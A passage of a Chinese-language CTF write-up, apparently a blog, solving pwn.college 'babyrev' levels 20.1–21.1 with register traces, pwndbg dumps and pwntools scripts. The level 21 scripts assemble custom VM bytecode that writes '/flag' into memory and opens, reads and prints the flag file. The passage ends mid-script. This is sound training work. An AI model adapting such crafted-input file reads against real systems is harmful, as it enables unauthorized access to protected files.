c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">2</span> i:<span class="hljs-number">93</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10800</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">1</span> i:<span class="hljs-number">94</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400800</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">95</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x840d5</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">0</span> i:d6 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404030</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">0</span> i:d7 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x14080</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">80</span> c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">0</span> i:d8 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10401c</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">80</span> c:<span class="hljs-number">1</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">0</span> i:d9 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x24002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">80</span> c:<span class="hljs-number">1</span>c d:<span class="hljs-number">2</span> s:<span class="hljs-number">0</span> i:da f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x21008</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">80</span> c:<span class="hljs-number">1</span>c d:dc s:<span class="hljs-number">0</span> i:db f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x802</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">80</span> c:<span class="hljs-number">1</span>c d:dc s:<span class="hljs-number">1</span> i:dc f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x84095</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">80</span> c:<span class="hljs-number">1</span>c d:dc s:<span class="hljs-number">1</span> i:<span class="hljs-number">96</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x401010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>c b:<span class="hljs-number">80</span> c:<span class="hljs-number">1</span>c d:dc s:<span class="hljs-number">1</span> i:<span class="hljs-number">97</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>c b:<span class="hljs-number">9</span>c c:<span class="hljs-number">1</span>c d:dc s:<span class="hljs-number">1</span> i:<span class="hljs-number">98</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x240ff</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>c b:<span class="hljs-number">9</span>c c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">1</span> i:<span class="hljs-number">99</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x401002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>c c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">1</span> i:<span class="hljs-number">9</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">1</span> i:<span class="hljs-number">9</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x840</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">2</span> i:<span class="hljs-number">9</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x801</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">3</span> i:<span class="hljs-number">9</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400140</span>							# <span class="hljs-number">01</span> : LDM a = *a<br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span>c b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">3</span> i:<span class="hljs-number">9</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10101</span>								# <span class="hljs-number">01</span> : LDM b = *b<br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span>c b:<span class="hljs-number">63</span> c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">3</span> i:<span class="hljs-number">9</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400401</span>							# <span class="hljs-number">04</span> : CMP a b	===	 cmp a1[<span class="hljs-number">0</span>x4b] a1[<span class="hljs-number">0</span>x9b]<br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span>c b:<span class="hljs-number">63</span> c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">3</span> i:a0 f:c<br><span class="hljs-attribute">0x10800</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span>c b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">2</span> i:a1 f:c<br><span class="hljs-attribute">0x400800</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">1</span> i:a2 f:c<br><span class="hljs-attribute">0x240a9</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:a9 s:<span class="hljs-number">1</span> i:a3 f:c<br><span class="hljs-attribute">0x82002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:a9 s:<span class="hljs-number">1</span> i:aa f:c<br><span class="hljs-attribute">0x20810</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:<span class="hljs-number">1</span>c s:<span class="hljs-number">1</span> i:ab f:c<br><span class="hljs-attribute">0x80800</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:<span class="hljs-number">1</span>c s:<span class="hljs-number">0</span> i:dd f:c<br><span class="hljs-attribute">0x104000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">0</span> d:<span class="hljs-number">1</span>c s:<span class="hljs-number">0</span> i:de f:c<br><span class="hljs-attribute">0x20410</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">0</span> d:<span class="hljs-number">1</span>c s:<span class="hljs-number">0</span> i:df f:a<br><span class="hljs-attribute">0x240b1</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">0</span> d:b1 s:<span class="hljs-number">0</span> i:e0 f:a<br><span class="hljs-attribute">0x102002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">0</span> d:b1 s:<span class="hljs-number">0</span> i:e1 f:a<br><span class="hljs-attribute">0x240ab</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">0</span> d:ab s:<span class="hljs-number">0</span> i:e2 f:a<br><span class="hljs-attribute">0x62002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">0</span> d:ab s:<span class="hljs-number">0</span> i:ac f:a<br><span class="hljs-attribute">0x140b8</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:b8 c:<span class="hljs-number">0</span> d:ab s:<span class="hljs-number">0</span> i:ad f:a<br><span class="hljs-attribute">0x10400a</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:b8 c:a d:ab s:<span class="hljs-number">0</span> i:ae f:a<br><span class="hljs-attribute">0x404001</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:b8 c:a d:ab s:<span class="hljs-number">0</span> i:af f:a<br><span class="hljs-attribute">0x48002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:b8 c:a d:a s:<span class="hljs-number">0</span> i:b0 f:a<br><span class="hljs-attribute">0x404001</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:b8 c:a d:a s:<span class="hljs-number">0</span> i:b1 f:a<br><span class="hljs-attribute">0x88000</span><br></code></pre></td></tr></table></figure>

<p>起始位置没有变，还是<code>$rax + 0x300</code>，加上我们的偏移就是<code>$rax + 0x300 + 0x9b - 27</code>，最后拿到目标字符串</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt;  x /<span class="hljs-number">28</span>bx $rax + <span class="hljs-number">0</span>x300 +<span class="hljs-number">0</span>x9b -<span class="hljs-number">27</span><br><span class="hljs-attribute">0x7ffd7698ca20</span>: <span class="hljs-number">0</span>x38    <span class="hljs-number">0</span>x62    <span class="hljs-number">0</span>x4d    <span class="hljs-number">0</span>x42    <span class="hljs-number">0</span>x6e    <span class="hljs-number">0</span>xdf    <span class="hljs-number">0</span>x72    <span class="hljs-number">0</span>xff<br><span class="hljs-attribute">0x7ffd7698ca28</span>: <span class="hljs-number">0</span>x09    <span class="hljs-number">0</span>x8e    <span class="hljs-number">0</span>x2b    <span class="hljs-number">0</span>x6f    <span class="hljs-number">0</span>x1e    <span class="hljs-number">0</span>xc8    <span class="hljs-number">0</span>x03    <span class="hljs-number">0</span>xe2<br><span class="hljs-attribute">0x7ffd7698ca30</span>: <span class="hljs-number">0</span>x53    <span class="hljs-number">0</span>x3b    <span class="hljs-number">0</span>x07    <span class="hljs-number">0</span>xfd    <span class="hljs-number">0</span>x79    <span class="hljs-number">0</span>x6e    <span class="hljs-number">0</span>x01    <span class="hljs-number">0</span>x57<br><span class="hljs-attribute">0x7ffd7698ca38</span>: <span class="hljs-number">0</span>xa8    <span class="hljs-number">0</span>x61    <span class="hljs-number">0</span>xa8    <span class="hljs-number">0</span>x63<br></code></pre></td></tr></table></figure>

<p>最后得出exp，但是我感觉我手动的有点麻烦，后面数据多的话写个脚本处理吧。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/tmp/babyrev-level-20-1&#x27;,&#x27;b printf&#x27;)</span><br>p = process(<span class="hljs-string">&quot;/challenge/babyrev-level-20-1&quot;</span>)<br>al = [<span class="hljs-number">0x38</span>-<span class="hljs-number">0xfe</span>, <span class="hljs-number">0x62</span>-<span class="hljs-number">0x9b</span>, <span class="hljs-number">0x4d</span>-<span class="hljs-number">0x3c</span>, <span class="hljs-number">0x42</span>-<span class="hljs-number">0xcc</span>, <span class="hljs-number">0x6e</span>-<span class="hljs-number">0xe3</span>, <span class="hljs-number">0xdf</span>-<span class="hljs-number">0xb0</span>, <span class="hljs-number">0x72</span>-<span class="hljs-number">0x1e</span>, <span class="hljs-number">0xff</span>-<span class="hljs-number">0xe6</span>, <span class="hljs-number">0x9</span>-<span class="hljs-number">0x88</span>, <span class="hljs-number">0x8e</span>-<span class="hljs-number">0x12</span>, <span class="hljs-number">0x2b</span>-<span class="hljs-number">0xa1</span>, <span class="hljs-number">0x6f</span>-<span class="hljs-number">0xd3</span>, <span class="hljs-number">0x1e</span>-<span class="hljs-number">0xc3</span>, <span class="hljs-number">0xc8</span>-<span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>-<span class="hljs-number">0xb2</span>, <span class="hljs-number">0xe2</span>-<span class="hljs-number">0xdf</span>, <span class="hljs-number">0x53</span>-<span class="hljs-number">0x95</span>, <span class="hljs-number">0x3b</span>-<span class="hljs-number">0xf6</span>, <span class="hljs-number">0x07</span>-<span class="hljs-number">0x98</span>, <span class="hljs-number">0xfd</span>-<span class="hljs-number">0x57</span>, <span class="hljs-number">0x79</span>-<span class="hljs-number">0x66</span>, <span class="hljs-number">0x6e</span>-<span class="hljs-number">0xc</span>, <span class="hljs-number">0x01</span>-<span class="hljs-number">0x77</span>, <span class="hljs-number">0x57</span>-<span class="hljs-number">0xe5</span>, <span class="hljs-number">0xa8</span>-<span class="hljs-number">0x6d</span>, <span class="hljs-number">0x61</span>-<span class="hljs-number">0x42</span>, <span class="hljs-number">0xa8</span>-<span class="hljs-number">0xbf</span>,<span class="hljs-number">0x63</span>- <span class="hljs-number">0x1c</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(al))<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(al)):<br>    <span class="hljs-comment"># print(al[i])</span><br><br>    payload += struct.pack(<span class="hljs-string">&#x27;B&#x27;</span>, (al[i]) % <span class="hljs-number">256</span>)<br><span class="hljs-comment"># payload = struct.pack(&#x27;21B&#x27;, *al)</span><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br><br>z = p.readline()<br><span class="hljs-keyword">while</span>(z):<br>    <span class="hljs-built_in">print</span>(z)<br>    z = p.readline()<br><br></code></pre></td></tr></table></figure>



<h4 id="level21-0"><a href="#level21-0" class="headerlink" title="level21.0"></a>level21.0</h4><p>这题需要自己写yancode，可以参考20.0，然后调试它。可以发现yancode是以三个字节三个字节作为一个指令的。也就是一个opcode加两个参数。那么根据不同的opcode和参数做出不同的操作。</p>
<p>这里需要做的是：将<code>/flag</code>字符串写入内存中，然后调用<code>open</code>，也就是<code>SYS open</code>打开<code>/flag</code>。它会返回一个文件描述符，通常为<code>0x3</code>。然后再调用<code>SYS read</code>，将<code>0x3</code>读入到内存中，它会返回读入的字节数，就是flag的长度为<code>0x39</code>。最后使用<code>SYS write</code>把内存中的flag读出来。exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/tmp/babyrev-level-21-0&#x27;, &#x27;b interpreter_loop&#x27;)</span><br>p = process(<span class="hljs-string">&quot;/challenge/babyrev-level-21-0&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>imm_a= <span class="hljs-number">0x403010</span>                                  <span class="hljs-comment"># IMM a = 0x30 </span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x402f40</span>                                 <span class="hljs-comment"># IMM b = 0x2f     &#x27;/&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x204010</span>                                <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]   <br>imm_a= <span class="hljs-number">0x403110</span>                                  <span class="hljs-comment"># IMM a = 0x31</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x406640</span>                                 <span class="hljs-comment"># IMM b = 0x66     &#x27;f&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x204010</span>                                     <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]   <br>imm_a= <span class="hljs-number">0x403210</span>                                  <span class="hljs-comment"># IMM a = 0x32</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x406c40</span>                                 <span class="hljs-comment"># IMM b = 0x6c     &#x27;l&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x204010</span>                                <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]     <br>imm_a= <span class="hljs-number">0x403310</span>                                  <span class="hljs-comment"># IMM a = 0x33</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x406140</span>                                 <span class="hljs-comment"># IMM b = 0x61     &#x27;a&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x204010</span>                                <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]  <br>imm_a= <span class="hljs-number">0x403410</span>                                  <span class="hljs-comment"># IMM a = 0x34</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x406740</span>                                 <span class="hljs-comment"># IMM b = 0x67     &#x27;g&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x204010</span>                               <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]      <br>imm_a= <span class="hljs-number">0x403010</span>                                  <span class="hljs-comment"># IMM a = 0x30 </span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x400040</span>                                 <span class="hljs-comment"># IMM b = 0     </span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_open = <span class="hljs-number">0x081008</span>                             <span class="hljs-comment"># open /flag</span><br>payload += p32(sys_open, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x404040</span>                                 <span class="hljs-comment"># IMM b = 0x40     </span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_c = <span class="hljs-number">0x40ff08</span>                                <span class="hljs-comment"># IMM c = 0xff</span><br>payload += p32(imm_c, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_read = <span class="hljs-number">0x080801</span>                              <span class="hljs-comment"># SYS Read</span><br>payload += p32(sys_read, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_a = <span class="hljs-number">0x400110</span>                                <span class="hljs-comment"># IMM a = 0x01</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x404040</span>                                 <span class="hljs-comment"># IMM b = 0x3     </span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_read = <span class="hljs-number">0x080820</span>                             <span class="hljs-comment"># SYS write</span><br>payload += p32(sys_read, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]     <br>exi = <span class="hljs-number">0x084004</span>                          <span class="hljs-comment"># exit</span><br><span class="hljs-comment"># pause()</span><br>payload += p32(exi, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    <span class="hljs-built_in">print</span>(p.readline())<br><br>p.close()<br></code></pre></td></tr></table></figure>



<h4 id="level21-1"><a href="#level21-1" class="headerlink" title="level21.1"></a>level21.1</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">40 </span>imm<br><span class="hljs-symbol">80 </span>add<br><span class="hljs-symbol">02 </span>stk<br><span class="hljs-symbol">04 </span>stm<br><span class="hljs-symbol">01 </span>ldm<br><span class="hljs-symbol">20 </span>cmp<br><span class="hljs-symbol">10 </span>jmp<br><span class="hljs-symbol">8 </span> sys<br></code></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">64</span>	<span class="hljs-selector-tag">a</span><br><span class="hljs-number">8</span>	<span class="hljs-selector-tag">b</span><br><span class="hljs-number">32</span>	c<br><span class="hljs-number">1</span>	d<br><span class="hljs-number">16</span>	s<br><span class="hljs-number">4</span>	<span class="hljs-selector-tag">i</span><br><span class="hljs-number">2</span>	f<br></code></pre></td></tr></table></figure>

<p>ida把对应的变量替换。因为每次指令对应的opcode以及变量对应的变量code都会变化。因此这里做一个替换。</p>
<p>不过替换之后还是有问题，通过gdb调试过程中发现，参数顺序换了。也就是arg1 和 arg2又恢复成正常顺序了，上面那题arg1 和 arg2是反着的。最后exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/tmp/babyrev-level-21-1&#x27;, &#x27;b interpreter_loop&#x27;)</span><br>p = process(<span class="hljs-string">&quot;/challenge/babyrev-level-21-1&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>imm_a= <span class="hljs-number">0x404030</span>                                  <span class="hljs-comment"># IMM a = 0x30 </span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x40082f</span>                                 <span class="hljs-comment"># IMM b = 0x2f     &#x27;/&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044008</span>                                <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]   <br>imm_a= <span class="hljs-number">0x404031</span>                                  <span class="hljs-comment"># IMM a = 0x31</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x400866</span>                                 <span class="hljs-comment"># IMM b = 0x66     &#x27;f&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044008</span>                                     <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]   <br>imm_a= <span class="hljs-number">0x404032</span>                                  <span class="hljs-comment"># IMM a = 0x32</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x40086c</span>                                 <span class="hljs-comment"># IMM b = 0x6c     &#x27;l&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044008</span>                                <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]     <br>imm_a= <span class="hljs-number">0x404033</span>                                 <span class="hljs-comment"># IMM a = 0x33</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x400861</span>                                 <span class="hljs-comment"># IMM b = 0x61     